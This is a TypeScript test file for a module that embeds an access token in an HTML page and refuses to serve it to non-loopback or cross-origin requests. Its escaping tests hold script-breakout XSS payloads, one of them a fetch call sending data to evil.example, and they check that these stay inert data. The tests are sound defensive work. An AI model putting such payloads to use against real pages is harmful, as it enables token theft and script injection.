import { Hono } from "hono";
import { describe, expect, it } from "vitest";
import {
  RUNTIME_CONFIG_ELEMENT_ID,
  TOKEN_SHELL_CACHE_CONTROL,
  injectRuntimeConfig,
  refuseUnsafeTokenDelivery,
  renderRuntimeConfigScript,
  serializeRuntimeConfig,
} from "./ui-runtime-config.js";

/** The two line terminators JavaScript honours and JSON does not. */
const LINE_SEPARATOR = "\u2028";
const PARAGRAPH_SEPARATOR = "\u2029";

/** Reads the block back out the way `apps/ui/src/app/apiClient.ts` does. */
function readInjectedToken(html: string): string {
  const match = new RegExp(
    `<script id="${RUNTIME_CONFIG_ELEMENT_ID}" type="application/json">([\\s\\S]*?)</script>`,
  ).exec(html);
  if (match === null) throw new Error("no runtime config block in the shell");
  const parsed: unknown = JSON.parse(match[1] ?? "");
  const token: unknown = (parsed as Record<string, unknown>)["token"];
  return typeof token === "string" ? token : "";
}

describe("serializeRuntimeConfig", () => {
  it("round-trips an ordinary token", () => {
    expect(JSON.parse(serializeRuntimeConfig({ token: "tok_abc123" }))).toEqual({
      token: "tok_abc123",
    });
  });

  it.each([
    ["a closing script tag", '</script><img src=x onerror="alert(1)">'],
    ["angle brackets and an ampersand", `<b>&"'</b>`],
    ["an HTML comment opener", "<!--><script>evil()</script>"],
    ["a JSON string escape", 'quote:" backslash:\\ newline:\n'],
    ["JS-only line terminators", `a${LINE_SEPARATOR}b${PARAGRAPH_SEPARATOR}c`],
    ["non-ASCII", "tok_ünïcødé_key"],
  ])("keeps %s inside the data block", (_name, token) => {
    const serialized = serializeRuntimeConfig({ token });

    expect(serialized).not.toContain("<");
    expect(serialized).not.toContain(">");
    expect(serialized.toLowerCase()).not.toContain("</script");
    expect(serialized).not.toContain(LINE_SEPARATOR);
    expect(serialized).not.toContain(PARAGRAPH_SEPARATOR);
    expect(JSON.parse(serialized)).toEqual({ token });
  });

  it("escapes the characters that could end the block, not the token's meaning", () => {
    expect(serializeRuntimeConfig({ token: "<&>" })).toBe('{"token":"\\u003c\\u0026\\u003e"}');
  });
});

describe("injectRuntimeConfig", () => {
  it("splices the block just inside <head>, before any application script", () => {
    const html =
      '<!doctype html><html lang="en"><head><title>Corpus</title></head><body><script type="module" src="/assets/app.js"></script></body></html>';
    const injected = injectRuntimeConfig(html, { token: "tok_abc123" });

    expect(injected.indexOf(RUNTIME_CONFIG_ELEMENT_ID)).toBeLessThan(
      injected.indexOf("/assets/app.js"),
    );
    expect(injected).toContain("<head><script id=");
    expect(readInjectedToken(injected)).toBe("tok_abc123");
  });

  it("keeps every byte of the original shell", () => {
    const html = "<!doctype html><html><head></head><body>board</body></html>";
    const injected = injectRuntimeConfig(html, { token: "t" });

    expect(injected.replace(renderRuntimeConfigScript({ token: "t" }), "")).toBe(html);
  });

  it("matches a <head> carrying attributes, case-insensitively", () => {
    const injected = injectRuntimeConfig('<HEAD data-x="1">hi</HEAD>', { token: "t" });
    expect(injected.startsWith('<HEAD data-x="1"><script id=')).toBe(true);
  });

  it("falls back to <body> when the shell has no head", () => {
    const injected = injectRuntimeConfig("<body>board</body>", { token: "t" });
    expect(injected.startsWith("<body><script id=")).toBe(true);
  });

  it("appends when the shell has neither, rather than dropping the token", () => {
    const injected = injectRuntimeConfig("<div id=root></div>", { token: "t" });
    expect(readInjectedToken(injected)).toBe("t");
  });

  it("survives a token that tries to break out of the block", () => {
    const hostile = '</script><script>fetch("//evil.example?t="+1)</script>';
    const injected = injectRuntimeConfig("<html><head></head></html>", { token: hostile });

    // Exactly one script tag exists: the block's own opener and closer.
    expect(injected.match(/<script/gi)).toHaveLength(1);
    expect(injected.match(/<\/script>/gi)).toHaveLength(1);
    // The hostile text survives as *data* — it just cannot become markup.
    expect(injected).not.toContain('<script>fetch("//evil.example');
    expect(readInjectedToken(injected)).toBe(hostile);
  });
});

describe("refuseUnsafeTokenDelivery", () => {
  function guardedApp(): Hono {
    const app = new Hono();
    app.get("/shell", async (c) => {
      const refusal = await refuseUnsafeTokenDelivery(c);
      return refusal ?? c.text("shell", 200);
    });
    return app;
  }

  async function request(
    remoteAddress: string | undefined,
    headers: Record<string, string> = {},
  ): Promise<Response> {
    return await guardedApp().request(
      "/shell",
      { headers },
      { incoming: { socket: { remoteAddress } } },
    );
  }

  it("lets a loopback peer with no Origin through", async () => {
    expect((await request("127.0.0.1")).status).toBe(200);
    expect((await request("::1")).status).toBe(200);
    expect((await request("::ffff:127.0.0.1")).status).toBe(200);
  });

  it("refuses a non-loopback peer with 403", async () => {
    expect((await request("192.168.1.50")).status).toBe(403);
  });

  it("ignores X-Forwarded-For, which the peer controls", async () => {
    const response = await request("203.0.113.7", { "X-Forwarded-For": "127.0.0.1" });
    expect(response.status).toBe(403);
  });

  it("refuses when no peer address is discoverable at all", async () => {
    expect((await request(undefined)).status).toBe(403);
  });

  it.each([
    ["a hostile origin", "https://evil.example"],
    ["an origin that looks like ours", "http://127.0.0.1:8935"],
    ["a null origin", "null"],
  ])("refuses %s even from loopback", async (_name, origin) => {
    const response = await request("127.0.0.1", { Origin: origin });
    expect(response.status).toBe(403);
  });
});

describe("TOKEN_SHELL_CACHE_CONTROL", () => {
  it("keeps a credential out of the browser's cache entirely", () => {
    expect(TOKEN_SHELL_CACHE_CONTROL).toBe("no-store");
  });
});
